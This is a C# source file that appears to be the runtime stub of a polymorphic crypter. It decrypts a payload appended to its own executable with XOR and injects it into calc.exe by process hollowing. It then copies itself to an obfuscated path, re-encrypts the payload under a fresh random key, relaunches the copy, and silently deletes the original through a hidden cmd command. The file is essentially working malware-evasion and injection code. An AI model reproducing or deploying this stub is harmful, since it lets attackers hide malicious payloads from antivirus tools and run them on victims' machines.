using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Security.Cryptography;

namespace xorStub
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static string ROT13Encode(string data, string key)
        {
            int dataLen = data.Length;
            int keyLen = key.Length;
            char[] output = new char[dataLen];

            for (int i = 0; i < dataLen; ++i)
            {
                output[i] = (char)(data[i] ^ key[i % keyLen]);
            }

            return new string(output);
        }

        // Calulate MD5 sum
        public static string checkMD5(string filename)
        {
            using (var md5 = MD5.Create())
            {
                using (var stream = File.OpenRead(filename))
                {
                    var hash = md5.ComputeHash(stream);
                    return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                }
            }
        }
        static class RandomUtil
        {
            public static string GetRandomString()
            {
                string path = Path.GetRandomFileName();
                path = path.Replace(".", "");
                return path;
            }
        }

        public static class Globals
        {
            public static String[] CurrentDirectoryy = new string[]
            {
                ROT13Encode("{", "AAAQSDQSDF"),
                ROT13Encode(" !# ", "QSDQSFFF"),
                ROT13Encode("#4200", "QSDQSDQFGHG"),
                ROT13Encode("')-$", "JHJLHJKYTUTYU"),
                ROT13Encode("!>6", "QDSFDFHNGFGN"),
                ROT13Encode("v&.2", "XCVW<X<WCBN")
            };
        }

        static void Main(string[] args)
        {
            //IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
            //ShowWindow(h, 0);
            while (true)
            {
                using (StreamReader streamReader = new StreamReader(System.Reflection.Assembly.GetEntryAssembly().Location))
                {
                    using (BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream))
                    {
                        byte[] stubBytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
                        string stubSettings = Encoding.ASCII.GetString(stubBytes).Substring(Encoding.ASCII.GetString(stubBytes).IndexOf("***")).Replace("***", "");
                        string randomKey = ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(stubSettings.Split('|')[1])), "randomkey");
                        string cipheredFile = stubSettings.Split('|')[0];

                        string[] CurrentDirectoryy = Globals.CurrentDirectoryy;
                        Console.WriteLine("[*] Stub current directory : " + System.AppDomain.CurrentDomain.BaseDirectory + "\\" + Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName));
                        Console.WriteLine("[*] MD5 sum : " + checkMD5(System.AppDomain.CurrentDomain.BaseDirectory + "\\" + Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName)));

                        var payload = Convert.FromBase64String(ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(cipheredFile)), randomKey));
                        string calculator = "C:\\Windows\\system32\\calc.exe";
                        string arguments = null;
                        Console.WriteLine("[*] Injecting file in calc.exe");
                        Mandark.Mandark.Load(payload, calculator, arguments);
                        Console.WriteLine("[!] Injected successfully.");


                        new MyTimer.MyTimer(10 * 1000, EventHandler, payload);

                        void EventHandler(object param)
                        {
                            string fileData = param.ToString();

                            Console.WriteLine("[*] 10 seconds passed");

                            int length = 25;
                            StringBuilder str_build = new StringBuilder();
                            Random random = new Random();
                            char letter;
                            for (int i = 0; i < length; i++)
                            {
                                double flt = random.NextDouble();
                                int shift = Convert.ToInt32(Math.Floor(25 * flt));
                                letter = Convert.ToChar(shift + 65);
                                str_build.Append(letter);
                            }

                            string newStubFilename = CurrentDirectoryy[0] + "\\" + CurrentDirectoryy[1] + "\\" + System.Environment.UserName + "\\" + CurrentDirectoryy[2] + "\\" + CurrentDirectoryy[3] + "\\" + CurrentDirectoryy[4] + "\\test\\" + RandomUtil.GetRandomString() + CurrentDirectoryy[5];

                            File.WriteAllBytes(newStubFilename, pePolymorpher.Properties.Resources.Stub);

                            Console.WriteLine("[*] New XOR key : " + str_build.ToString());
                            Console.WriteLine("[*] New stub filename : " + newStubFilename);

                            String file = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ROT13Encode(Convert.ToBase64String(payload), str_build.ToString())));
                            String newRandomKey = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ROT13Encode(str_build.ToString(), "randomkey")));

                            using (FileStream filestream = new FileStream(newStubFilename, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
                            {
                                using (BinaryWriter binaryWriter = new BinaryWriter(filestream))
                                {
                                    filestream.Position = filestream.Length + 1;
                                    binaryWriter.Write("***" + file + "|" + newRandomKey);
                                    Console.WriteLine("[!] Original file successfully injected in new Stub");
                                }
                            }

                            Process p = new Process();
                            p.StartInfo.FileName = newStubFilename;
                            p.EnableRaisingEvents = true;
                            p.Start();
                            if (System.AppDomain.CurrentDomain.BaseDirectory.Contains("Temp"))
                            {
                                Console.WriteLine("[*] Removing : " + System.AppDomain.CurrentDomain.BaseDirectory + "\\" + Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName));
                                Process.Start(new ProcessStartInfo()
                                {
                                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + System.AppDomain.CurrentDomain.BaseDirectory + "\\" + Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName) + "\"",
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    CreateNoWindow = true,
                                    FileName = "cmd.exe"
                                });
                            }

                            System.Diagnostics.Process.Start("cmd.exe", "/c taskkill /IM calc.exe");

                            Environment.Exit(0);

                        }

                        Console.ReadLine();
                    }
                }

            }
        }

    }
}
